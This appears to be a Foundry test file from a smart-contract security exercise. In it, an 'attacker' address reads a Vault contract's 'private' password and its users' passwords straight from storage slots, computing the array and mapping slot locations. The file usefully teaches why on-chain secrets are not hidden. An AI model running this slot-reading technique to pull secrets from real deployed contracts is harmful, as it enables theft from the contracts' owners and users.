// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Vault.sol";

contract Private is Test {
    Vault vault;
    address owner1 = address(0x1);
    address attacker2 = address(0x2);
    bytes32 password = bytes32("secret");
    bytes32 userPass0 = bytes32("secret0");
    bytes32 userPass1 = bytes32("secret1");
    bytes32 userPass2 = bytes32("secret2");

    function setUp() public {
        vm.startPrank(owner1);
        vault = new Vault(password);
        vm.stopPrank();
    }

    function testReadPasswordFromSlot() public {
        vm.startPrank(attacker2);
        bytes32 pw = vm.load(address(vault), bytes32(uint256(2)));
        assertEq(password, pw); // Gets password value.
        vm.stopPrank();
    }

    function getArrayLocation(
        uint256 slot,
        uint256 index,
        uint256 elementSize
    ) public pure returns (uint256) {
        return
            uint256(keccak256(abi.encodePacked(slot))) + (index * elementSize);
    }

    function getMapLocation(uint256 slot, uint256 key)
        public
        pure
        returns (uint256)
    {
        return uint256(keccak256(abi.encodePacked(key, slot)));
    }

    function testReadUsersArrayAndMapFromSlots() public {
        vm.startPrank(owner1);
        vault.addUser(userPass0);
        vault.addUser(userPass1);
        vault.addUser(userPass2);
        vm.stopPrank();

        vm.startPrank(attacker2);

        /* ARRAY */

        // Array starts at slot 6.
        // Element size is 2 slots.
        bytes32 userId0 = vm.load(
            address(vault),
            bytes32(getArrayLocation(6, 0, 2)) // +0 to get id
        );
        bytes32 userId1 = vm.load(
            address(vault),
            bytes32(getArrayLocation(6, 1, 2))
        );
        bytes32 userId2 = vm.load(
            address(vault),
            bytes32(getArrayLocation(6, 2, 2))
        );
        bytes32 userPw0 = vm.load(
            address(vault),
            bytes32(getArrayLocation(6, 0, 2) + 1) // +1 to get pw
        );
        bytes32 userPw1 = vm.load(
            address(vault),
            bytes32(getArrayLocation(6, 1, 2) + 1)
        );
        bytes32 userPw2 = vm.load(
            address(vault),
            bytes32(getArrayLocation(6, 2, 2) + 1)
        );

        // asserting id
        assertEq(uint256(userId0), 0);
        assertEq(uint256(userId1), 1);
        assertEq(uint256(userId2), 2);

        // asserting password
        assertEq(userPw0, userPass0);
        assertEq(userPw1, userPass1);
        assertEq(userPw2, userPass2);

        /* MAPPING */
        // starts in slot 7
        bytes32 idToUser0 = vm.load(
            address(vault),
            bytes32(getMapLocation(7, 0))
        );
        bytes32 idToUser1 = vm.load(
            address(vault),
            bytes32(getMapLocation(7, 1))
        );
        bytes32 idToUser2 = vm.load(
            address(vault),
            bytes32(getMapLocation(7, 2))
        );
        bytes32 pwToUser0 = vm.load(
            address(vault),
            bytes32(getMapLocation(7, 0) + 1)
        );
        bytes32 pwToUser1 = vm.load(
            address(vault),
            bytes32(getMapLocation(7, 1) + 1)
        );
        bytes32 pwToUser2 = vm.load(
            address(vault),
            bytes32(getMapLocation(7, 2) + 1)
        );

        // asserting users id
        assertEq(uint256(idToUser0), 0);
        assertEq(uint256(idToUser1), 1);
        assertEq(uint256(idToUser2), 2);

        // asserting passwords
        assertEq(pwToUser0, userPass0);
        assertEq(pwToUser1, userPass1);
        assertEq(pwToUser2, userPass2);

        vm.stopPrank();
    }
}
